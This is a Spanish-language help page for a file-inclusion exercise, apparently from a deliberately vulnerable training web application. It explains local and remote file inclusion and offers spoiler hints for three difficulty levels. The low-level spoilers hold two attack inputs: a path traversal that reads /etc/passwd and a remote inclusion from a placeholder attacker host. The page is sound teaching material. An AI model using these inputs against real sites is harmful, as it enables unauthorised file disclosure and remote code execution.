<div class="body_padded">
	<h1>Ayuda - File Inclusion</h1>

	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">
		<h3>Info</h3>
		<p>Algunas aplicaciones web le permiten al usuario especificar la entrada que se usa directamente en flujos de archivos o permite que el usuario cargue archivos al servidor.En un momento posterior, la aplicación web accede a la entrada proporcionada por el usuario en el contexto de aplicaciones web. Al hacer esto, la aplicación web está permitiendo el potencial de ejecución de archivos maliciosos.</p>

		<p>Si el archivo elegido para ser incluido es local en la máquina de destino, se denomina "Inclusión de archivos locales (LFI). Pero los archivos también pueden incluirse en otros máquinas, que luego el ataque es una "Inclusión de archivos remotos (RFI).</p>

		<p>Cuando RFI no es una opción. el uso de otra vulnerabilidad con LFI (como la carga de archivos y el cruce de directorios) a menudo puede lograr el mismo efecto.</p>

		<p>Tenga en cuenta que el término "inclusión de archivos" no es lo mismo que "acceso arbitrario a archivos" o "divulgación de archivos".</p>

		<br /><hr /><br />

		<h3>Objetivo</h3>
		<p>Lea las <u>cinco</u> citas famosas de '<a href="../hackeable/flags/fi.php">../hackeable/flags/fi.php</a>' usando solo la inclusión del archivo.</p>

	<br /><hr /><br />

	<h3>Nivel bajo</h3>
	<p>Esto permite la entrada directa en <u>una de las muchas funciones de PHP</u> que incluirán el contenido al ejecutarse.</p>

	<p>Dependiendo de la configuración del servicio web, dependerá si RFI es una posibilidad.</p>
		<pre>Spoiler: <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
			Spoiler: <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>

		<br />
	<h3>Nivel Medio</h3>
	<p>El desarrollador leyó algunos de los problemas con LFI/RFI y decidió filtrar la entrada. Sin embargo, los patrones que se utilizan no 	son suficientes.</p>
		<pre>Spoiler: <span class="spoiler">LFI: Posible, debido a que solo recorre la coincidencia de patrones una vez</span>.
			Spoiler: <span class="spoiler">RFI: <?php echo pvwaExternalLinkUrlGet( 'https://secure.php.net/manual/en/wrappers.php', 'PHP Streams' ); ?></span>.</pre>

		<br />

		<h3>Nivel alto</h3>
	<p>El desarrollador ha tenido suficiente. Decidieron permitir que solo se usaran ciertos archivos. Sin embargo, como hay varios archivos 	con el mismo nombre base,usan un comodín para incluirlos a todos.</p>
		<pre>Spoiler: <span class="spoiler">LFI: El nombre del archivo solo comienza con un cierto valor.</span>.
			Spoiler: <span class="spoiler">RFI: Necesidad de vincular otra vulnerabilidad, como la carga de archivos</span>.</pre>

		<br />

	</div></td>
	</tr>
	</table>

	</div>

	<br />

	<p>Referencia: <?php echo pvwaExternalLinkUrlGet( 'https://en.wikipedia.org/wiki/Remote_File_Inclusion', 'Wikipedia - File inclusion vulnerability' ); ?></p>
	<p>Referencia: <?php echo pvwaExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion', 'WSTG - Local File Inclusion' ); ?></p>
	<p>Referencia: <?php echo pvwaExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion', 'WSTG - Remote File Inclusion' ); ?></p>
	<p>Referencia: <?php echo pvwaExternalLinkUrlGet( 'https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion', 'PHP File Inclusion' ); ?></p>

</div>
